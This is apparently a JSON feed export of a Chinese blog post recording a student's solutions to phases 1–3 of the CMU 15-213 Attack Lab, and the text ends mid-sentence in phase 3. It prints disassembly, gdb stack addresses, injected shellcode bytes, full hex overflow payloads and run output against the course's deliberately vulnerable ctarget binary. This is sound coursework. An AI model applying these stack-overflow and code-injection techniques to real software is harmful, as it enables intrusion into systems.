{
    "version": "https://jsonfeed.org/version/1",
    "title": "望春风",
    "description": "计算机&数理&文学爱好者，喜欢健身、下厨、听音乐和看电影",
    "home_page_url": "https://salvely.github.io/blog",
    "items": [
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 3-Attack lab 实验记录",
            "date_published": "2024-02-29T02:36:22.000Z",
            "content_html": "<h2 id=\"准备工作\"><a class=\"markdownIt-Anchor\" href=\"#准备工作\">#</a> 准备工作</h2>\n<p>文件夹中的几个重要文件如下：</p>\n<ul>\n<li>cookie.txt: 8 个 16 进制数字的码，用于唯一标记</li>\n<li>ctarget: 准备用于 code injection attack</li>\n<li>farm.c: 用于 return oriented programming attacks</li>\n<li>hex2raw: 用于生成攻击的二进制文件</li>\n<li>README.txt: 介绍了文件夹中文件的内容</li>\n<li>rtarget: 准备用于 return oriented programming attacks</li>\n</ul>\n<p>实验分为 5 个 phase，其中 Phase 1 到 phase 3 是使用 code injection attack，phase 4-5 使用 return oriented programming attack。</p>\n<h2 id=\"part-i-code-injection-attack\"><a class=\"markdownIt-Anchor\" href=\"#part-i-code-injection-attack\">#</a> Part I: Code Injection Attack</h2>\n<h3 id=\"phase-1覆盖返回地址\"><a class=\"markdownIt-Anchor\" href=\"#phase-1覆盖返回地址\">#</a> Phase 1：覆盖返回地址</h3>\n<p>在这个 phase 中，我们需要引导 ctarget 中的 <code>test</code>  函数返回到 <code>touch1</code>  函数。首先我们对 <code>ctarget</code>  做反汇编。其中 <code>test</code>  函数的汇编代码如下：</p>\n<pre><code>0000000000401968 &lt;test&gt;:\n  401968:\t48 83 ec 08          \tsub    $0x8,%rsp\n  40196c:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401971:\te8 32 fe ff ff       \tcallq  4017a8 &lt;getbuf&gt;\n  401976:\t89 c2                \tmov    %eax,%edx\n  401978:\tbe 88 31 40 00       \tmov    $0x403188,%esi\n  40197d:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  401982:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401987:\te8 64 f4 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  40198c:\t48 83 c4 08          \tadd    $0x8,%rsp\n  401990:\tc3                   \tretq\n</code></pre>\n<p>而 <code>touch1</code>  函数的地址是 <code>0x4017c0</code> 。</p>\n<p>在这其中我们调用 <code>getbuf</code>  函数来进行 buffer overflow 攻击，原本的该函数的下一条返回地址是 <code>0x401976</code> ，我们需要将其换成 <code>0x4017c0</code> 。我们现在对 <code>getbuf</code>  进行反汇编 (nop 指令省去)：</p>\n<pre><code>00000000004017a8 &lt;getbuf&gt;:\n  4017a8:\t48 83 ec 28          \tsub    $0x28,%rsp\n  4017ac:\t48 89 e7             \tmov    %rsp,%rdi\n  4017af:\te8 8c 02 00 00       \tcallq  401a40 &lt;Gets&gt;\n  4017b4:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4017b9:\t48 83 c4 28          \tadd    $0x28,%rsp\n  4017bd:\tc3                   \tretq\n</code></pre>\n<p>对该过程进行分析：</p>\n<ol>\n<li>留出 40 个字节的位置</li>\n<li>rdi = rsp</li>\n<li>调用 gets 函数</li>\n<li>eax = 1</li>\n<li>恢复栈空间</li>\n<li>返回</li>\n</ol>\n<p>要完成这个实验，我们需要直到几个值：</p>\n<ol>\n<li>buf 的位置：应该进入 <code>getbuf</code>  后， <code>%rsp - 40</code>  之后的位置</li>\n<li>返回地址在栈中位置：在调用 <code>callq</code>  函数时，我们会将 <code>%rsp - 8</code> ，然后将返回地址压入，然后将 <code>%rip</code>  设置为 <code>getbuf</code>  函数的地址。（同理，调用 <code>retq</code>  的时候，我们会把栈顶的地址赋给 <code>%rip</code> ，然后让 <code>%rsp + 8</code> ，也就是弹出返回地址）因此返回地址在栈中的位置也就是调用完 <code>callq</code>  之后 <code>%rsp</code>  的位置。</li>\n<li><code>touch1</code>  函数的地址: <code>0x4017c0</code></li>\n</ol>\n<p>这样来看，buf 及其本地变量部分应该是分配了 40 个字节，而返回地址有 8 个字节，因此我们在写入的时候，前 40 个字节随意（不能有 0x0a, 那个是换行符）。因为是小端法，最后 8 个字节应该是 <code>0xc0 0x17 0x40</code> 。</p>\n<p>该阶段输入内容存储在 <code>phase1.txt</code>  中，内容如下： <code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40</code> 。输入命令 <code>./hex2raw &lt; phase1.txt | ./ctarget -q</code>  进行测试 ( <code>-q</code>  是指运行在本地电脑上)，结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Type string:Touch1<span class=\"token operator\">!</span>: You called touch1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Valid solution <span class=\"token keyword\">for</span> level <span class=\"token number\">1</span> with target ctarget</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        user <span class=\"token function\">id</span> bovik</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        course  <span class=\"token number\">15213</span>-f15</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        result  <span class=\"token number\">1</span>:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 <span class=\"token number\">17</span> <span class=\"token number\">40</span></pre></td></tr></table></figure><p>成功！</p>\n<h3 id=\"phase-2在-buf-中插入攻击代码并覆盖返回地址\"><a class=\"markdownIt-Anchor\" href=\"#phase-2在-buf-中插入攻击代码并覆盖返回地址\">#</a> Phase 2：在 buf 中插入攻击代码并覆盖返回地址</h3>\n<p>在这个 phase 中我们需要在 buffer overflow 字符串中保留一部分攻击代码，让 <code>test</code>  函数返回到 <code>touch2</code> ，而且我们需要让 <code>val</code>  的值等于 <code>cookie</code>  的值。（而且这里我们不能直接让 <code>test</code>  返回到打印 <code>Touch2!</code>  那一句，因为前面有 <code>vlevel = 2</code> ，后面需要验证这个值是不是 2，如果直接跳到那一句的话， <code>vlevel</code>  没有赋值，也肯定不等于 2，验证就会失败）。</p>\n<p><code>touch2</code>  的函数源码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">touch2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    vlevel <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Part of validation protocol */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>val <span class=\"token operator\">==</span> cookie<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Touch2!: You called touch2(0x%.8x)\\n\"</span><span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">validate</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Misfire: You called touch2(0x%.8x)\\n\"</span><span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token function\">fail</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>touch2</code>  的汇编函数如下：</p>\n<pre><code>00000000004017ec &lt;touch2&gt;:\nseg1:\n  4017ec:\t48 83 ec 08          \tsub    $0x8,%rsp\n  4017f0:\t89 fa                \tmov    %edi,%edx\n  4017f2:\tc7 05 e0 2c 20 00 02 \tmovl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;\n  4017f9:\t00 00 00\n  4017fc:\t3b 3d e2 2c 20 00    \tcmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;\n  401802:\t75 20                \tjne    401824 &lt;touch2+0x38&gt;\n  401804:\tbe e8 30 40 00       \tmov    $0x4030e8,%esi\n  401809:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  40180e:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401813:\te8 d8 f5 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  401818:\tbf 02 00 00 00       \tmov    $0x2,%edi\n  40181d:\te8 6b 04 00 00       \tcallq  401c8d &lt;validate&gt;\n  401822:\teb 1e                \tjmp    401842 &lt;touch2+0x56&gt;\nseg2:\n  401824:\tbe 10 31 40 00       \tmov    $0x403110,%esi\n  401829:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  40182e:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401833:\te8 b8 f5 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  401838:\tbf 02 00 00 00       \tmov    $0x2,%edi\n  40183d:\te8 0d 05 00 00       \tcallq  401d4f &lt;fail&gt;\nseg3:\n  401842:\tbf 00 00 00 00       \tmov    $0x0,%edi\n  401847:\te8 f4 f5 ff ff       \tcallq  400e40 &lt;exit@plt&gt;\n</code></pre>\n<p>从上述汇编代码可以看出， <code>val</code>  的值在最开始存在 <code>edi</code>  处。那么我们的目的就是让这个值等于 <code>cookie</code> 。而且 <code>cookie</code>  的位置是 <code>6044e4</code> 。所以我们的目的是让 <code>%edi</code>  寄存器的值等于 <code>6044e4</code>  处的值。</p>\n<p>要实现攻击，我们的 buffer overflow 必须完成四步动作：</p>\n<ol>\n<li>让 return address 等于 buf 的开头</li>\n<li>在 buf 开头插入赋值语句，让 <code>%edi = *0x6044e4</code></li>\n<li>让 return address = touch2 的入口地址 ( <code>0x4017ec</code> )</li>\n<li>调用 <code>ret</code></li>\n</ol>\n<p>首先，要完成第一步，我们首先得找到 buf 的开头位置。通过 phase 1 的 getbuf 我们可以知道，buf 的位置在压完返回地址后减去 40 个字节的位置。因为前三问的栈的位置固定，因此我们可以通过 gdb 看一下减去 40 以后 <code>%rsp</code>  在哪里。<br>\n我们着重观察 3 个地方的 <code>$rsp</code> ：</p>\n<ol>\n<li>调用 <code>getbuf</code>  之前: 0x5561dca8</li>\n<li>调用 <code>getbuf</code>  之后: 0x5561dca0</li>\n<li>调用 <code>rsp = rsp - 40</code>  之后: 0x5561dc78</li>\n</ol>\n<p>那么我们可以判断 buf 的起始位置是 <code>0x5561dc78</code> ，返回地址的位置在其后 40 个字节处，也就是 <code>0x5561dca0</code> 。那么我们需要让 return address (buf 最后 8 个字节) 的值等于 <code>0x5561dc78</code> 。换成小端序就是 <code>0x78 0xdc 0x61 0x55</code> 。</p>\n<p>第二条要生成的指令应该是:</p>\n<pre><code>movl $0x6044e4,%eax\nmovl (%eax),%edi\n</code></pre>\n<p>第三条要生成的指令应该是：</p>\n<pre><code>subq $0x8,%rsp\nmovl 0x4017ec,($rsp)\n</code></pre>\n<p>最后一条插入的指令是 <code>ret</code> ，在这个过程中， <code>%rsp</code>  处的内容会被赋值给 <code>%rip</code> ， <code>%rsp</code>  会自动加上 8。</p>\n<p>最后插入数条 <code>nop</code>  指令实现 PC 的顺序累加。</p>\n<p>由于这些指令在 Appendix A 表格中没有，所以我们需要手动生成。我们将如下内容保存在文件中：</p>\n<pre><code>    movl $0x6044e4,%eax\n    movl (%eax),%edi\n    subq $0x8,%rsp\n    movl $0x4017ec,(%rsp)\n    ret\n    nop\n    nop\n    nop\n    nop\n</code></pre>\n<p>然后使用 <code>gcc -c ph2.s</code>  生成 <code>ph2.o</code>  文件，然后使用 <code>objdump -d ph2.o &gt; ph2.d</code> ，打开 <code>ph2.d</code> ，有如下内容：</p>\n<pre><code>\nph2.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tb8 e4 44 60 00       \tmov    $0x6044e4,%eax\n   5:\t67 8b 38             \tmov    (%eax),%edi\n   8:\t48 83 ec 08          \tsub    $0x8,%rsp\n   c:\tc7 04 24 ec 17 40 00 \tmovl   $0x4017ec,(%rsp)\n  13:\tc3                   \tretq\n  14:\t90                   \tnop\n  15:\t90                   \tnop\n  16:\t90                   \tnop\n  17:\t90                   \tnop\n</code></pre>\n<p>那么我们所需要的字节就是 <code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3</code> ，共 20 字节。后续再插入 20 个字节的 <code>nop</code> (0x90)</p>\n<p>完整的字符串是 <code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55</code> ，我将其保存在 <code>phase2.txt</code>  中。</p>\n<blockquote>\n<p>注：一开始把 <code>0x5561dc78</code>  打成了 <code>0x5564dc78</code>  导致出现访问了未被初始化的位置，出现了 segmentation fault。在输入地址的时候要小心谨慎，不要出现太多问题。</p>\n<p>此外，注入代码的时候需要手动添加 <code>ret</code>  指令，否则程序不知道要返回，就算 buffer overflow 覆盖了返回地址也没用。</p>\n</blockquote>\n<p>结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Type string:Touch2<span class=\"token operator\">!</span>: You called touch2<span class=\"token punctuation\">(</span>0x59b997fa<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Valid solution <span class=\"token keyword\">for</span> level <span class=\"token number\">2</span> with target ctarget</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        user <span class=\"token function\">id</span> bovik</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        course  <span class=\"token number\">15213</span>-f15</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        result  <span class=\"token number\">1</span>:PASS:0xffffffff:ctarget:2:B8 E4 <span class=\"token number\">44</span> <span class=\"token number\">60</span> 00 <span class=\"token number\">67</span> 8B <span class=\"token number\">38</span> <span class=\"token number\">48</span> <span class=\"token number\">83</span> EC 08 C7 04 <span class=\"token number\">24</span> EC <span class=\"token number\">17</span> <span class=\"token number\">40</span> 00 C3 <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">78</span> DC <span class=\"token number\">61</span> <span class=\"token number\">55</span></pre></td></tr></table></figure><p>成功！</p>\n<h3 id=\"phase-3在-buf-中插入所需字符串和攻击代码并覆盖返回地址\"><a class=\"markdownIt-Anchor\" href=\"#phase-3在-buf-中插入所需字符串和攻击代码并覆盖返回地址\">#</a> Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址</h3>\n<p>在 phase 3 中，我们需要让程序在 <code>getbuf</code>  后，运行 <code>touch3</code>  函数，其注入方式和 phase 2 类似。（此处需要利用 <code>vlevel = 3</code>  进行跳转后验证，因此和上次一样，我们不能直接跳转到 <code>Touch3!</code>  语句，还是需要注入代码，将 <code>%rdi</code>  设置为 <code>cookie</code>  的值，然后再引导程序跳转到 <code>touch3</code>  的开头语句）。 <code>touch3</code>  函数的 C 语言版本如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Compare string to hex represention of unsigned value */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">hexmatch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> val<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>sval<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">char</span> cbuf<span class=\"token punctuation\">[</span><span class=\"token number\">110</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">/* Make position of check string unpredictable */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token operator\">=</span> cbuf <span class=\"token operator\">+</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%.8x\"</span><span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">strncmp</span><span class=\"token punctuation\">(</span>sval<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">touch3</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>sval<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    vlevel <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Part of validation protocol */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">hexmatch</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">,</span> sval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Touch3!: You called touch3(\"</span><span class=\"token operator\">%</span>s<span class=\"token string\">\")\\n\"</span><span class=\"token punctuation\">,</span> sval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token function\">validate</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Misfire: You called touch3(\"</span><span class=\"token operator\">%</span>s<span class=\"token string\">\")\\n\"</span><span class=\"token punctuation\">,</span> sval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">fail</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"一开始的错误解答\"><a class=\"markdownIt-Anchor\" href=\"#一开始的错误解答\">#</a> 一开始的错误解答</h4>\n<p>这里的差别在于我们输入的 <code>string</code>  是一个 <code>cookie</code>  的字符串表示。我们对 <code>touch3</code>  做反汇编看看 <code>cookie</code>  的字符串表示存在哪里？</p>\n<pre><code>   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;\n</code></pre>\n<p>我们输入 <code>x/s 0x6044e4</code>  看看结果：</p>\n<pre><code>(gdb) x/s 0x6044e4\n0x6044e4 &lt;cookie&gt;:      &quot;&quot;\n</code></pre>\n<p>这里同样，可以看出来和上一次的 <code>cookie</code>  放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值 <code>%rdi</code>  设置为 <code>0x6044e4</code>  位置的值。而这次 <code>%rdi</code>  指向输入的字符串，我们需要做的是将 <code>%rdi</code>  设置为 <code>0x6044e4</code> 。</p>\n<p>此外， <code>touch3</code>  的入口地址为 <code>0x4018fa</code> 。因此在最后需要让 return address 等于这个值。</p>\n<p>那么总体的注入和上次遵循一样的步骤：</p>\n<ol>\n<li>让 return address 等于 buf 的开头 ( <code>0x5561dc78</code> )</li>\n<li>在 buf 开头插入赋值语句，让 <code>%edi = 0x6044e4</code></li>\n<li>让 return address = touch3 的入口地址 ( <code>0x4018fa</code> )</li>\n<li>调用 <code>ret</code></li>\n</ol>\n<p>综上，这次的调用语句是：</p>\n<pre><code>    movl $0x6044e4,%edi\n    subq $0x8,%rsp\n    movl $0x4018fa,(%rsp)\n    ret\n    nop\n    nop\n    nop\n    nop\n</code></pre>\n<p>将其保存在 <code>ph3.s</code>  中，输入 <code>gcc -c ph3.s</code>  生成 <code>ph3.o</code>  文件，再 <code>objdump -d ph3.o &gt; ph3.d</code> ，生成 <code>ph3.d</code>  文件。</p>\n<p>文件内容如下：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf e4 44 60 00       \tmov    $0x6044e4,%edi\n   5:\t48 83 ec 08          \tsub    $0x8,%rsp\n   9:\tc7 04 24 fa 18 40 00 \tmovl   $0x4018fa,(%rsp)\n  10:\tc3                   \tretq\n  11:\t90                   \tnop\n  12:\t90                   \tnop\n  13:\t90                   \tnop\n  14:\t90                   \tnop\n\n</code></pre>\n<p>那么其一直到 <code>ret</code>  的字节即为 <code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code> 。一共 17 个字节。将其字节复制到 <code>phase3.txt</code>  的最前面。添加 23 个 <code>nop</code> ( <code>0x90</code> ) 凑齐 40 个字节，最后 8 个字节的值必须等于 <code>0x5561dc78</code> 。换成小端序就是 <code>0x78 0xdc 0x61 0x55</code> 。</p>\n<p>完整字符串如下：</p>\n<pre><code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55\n</code></pre>\n<p>输入 <code>./hex2raw &lt; phase3.txt | ./ctarget </code> 。结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Type string:Misfire: You called touch3<span class=\"token punctuation\">(</span><span class=\"token string\">\"���Y\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>FAIL: Would have posted the following:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        user <span class=\"token function\">id</span> bovik</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        course  <span class=\"token number\">15213</span>-f15</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        result  <span class=\"token number\">1</span>:FAIL:0xffffffff:ctarget:3:BF E4 <span class=\"token number\">44</span> <span class=\"token number\">60</span> 00 <span class=\"token number\">48</span> <span class=\"token number\">83</span> EC 08 C7 04 <span class=\"token number\">24</span> FA <span class=\"token number\">18</span> <span class=\"token number\">40</span> 00 C3 <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">78</span> DC <span class=\"token number\">61</span> <span class=\"token number\">55</span></pre></td></tr></table></figure><p>最后确实跳转到了 <code>touch3</code> ，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽)</p>\n<h4 id=\"忽略随机栈空间的不正确解答\"><a class=\"markdownIt-Anchor\" href=\"#忽略随机栈空间的不正确解答\">#</a> 忽略随机栈空间的不正确解答</h4>\n<p>我们最早是认为，应该让 <code>%edi</code>  指向 <code>0x6044e4</code> ，也就是 <code>cookie</code>  字符串所在的位置，来让 <code>%edi</code>  和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现， <code>cookie</code>  不是个字符串，还是个 <code>unsigned</code>  类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让 <code>输入的字符串</code> 和 <code>打印出来的 cookie 的值</code> 相同。所以这里不能让 <code>%rdi</code>  指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给 <code>%rdi</code> ，然后让 <code>%rdi</code>  和 <code>cookie</code>  的打印版进行比较。</p>\n<p>那么 <code>cookie</code>  的值是多少？我们使用 <code>p /x cookie</code>  命令打印一下：</p>\n<pre><code>(gdb) p /x cookie\n$4 = 0x59b997fa\n</code></pre>\n<p>所以输入的字符串应该是 <code>0x59b997fa</code> 。</p>\n<p>经过阅读 attacklab.pdf，作者给出了以下几个提示：</p>\n<ol>\n<li>攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x）</li>\n<li>字符串最后应该有个 0，输入 <code>man ascii</code>  在 Linux 中查找 ascii 表</li>\n<li>攻击代码应该让 <code>%rdi</code>  的值等于这个字符串的起始地址</li>\n<li><code>hexmatch</code>  和 <code>strncmp</code>  可能会覆盖一部分 <code>getbuf</code>  中的 buf，注意不要让你的攻击字符串被覆盖掉。</li>\n</ol>\n<p>那么初始的准备工作应该是：</p>\n<ol>\n<li>确定插入字符串和攻击代码的有效区域，防止被 <code>hexmatch</code> 